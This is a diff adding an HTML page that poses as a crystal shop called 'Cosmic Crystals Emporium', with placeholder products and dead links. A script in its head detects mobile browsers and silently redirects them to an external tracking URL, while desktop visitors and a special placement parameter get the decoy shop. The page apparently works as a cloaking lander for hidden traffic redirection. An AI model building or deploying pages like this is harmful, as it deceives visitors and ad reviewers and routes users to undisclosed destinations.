@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/7030fb24-f71e-4d19-916a-a1c232f79601?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Crystals Emporium</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(135deg, #000033, #660066);
+            color: #e6e6ff;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 0 0 10px #ff00ff;
+        }
+        nav {
+            display: flex;
+            justify-content: space-around;
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 10px;
+        }
+        nav a {
+            color: #ff99ff;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        main {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            padding: 20px;
+        }
+        .product {
+            background-color: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+        }
+        .product img {
+            max-width: 100%;
+            border-radius: 5px;
+        }
+        footer {
+            background-color: rgba(0, 0, 0, 0.5);
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Cosmic Crystals Emporium</h1>
+    </header>
+    <nav>
+        <a href="#">Home</a>
+        <a href="#">Shop</a>
+        <a href="#">About</a>
+        <a href="#">Contact</a>
+    </nav>
+    <main>
+        <div class="product">
+            <img src="https://placehold.co/200x200?text=Amethyst" alt="Amethyst">
+            <h2>Amethyst Cluster</h2>
+            <p>Enhance your spiritual journey</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <img src="https://placehold.co/200x200?text=Quartz" alt="Quartz">
+            <h2>Clear Quartz Point</h2>
+            <p>Amplify your intentions</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <img src="https://placehold.co/200x200?text=Citrine" alt="Citrine">
+            <h2>Citrine Geode</h2>
+            <p>Manifest abundance and success</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <img src="https://placehold.co/200x200?text=Selenite" alt="Selenite">
+            <h2>Selenite Wand</h2>
+            <p>Cleanse and purify your space</p>
+            <button>Add to Cart</button>
+        </div>
+    </main>
+    <footer>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
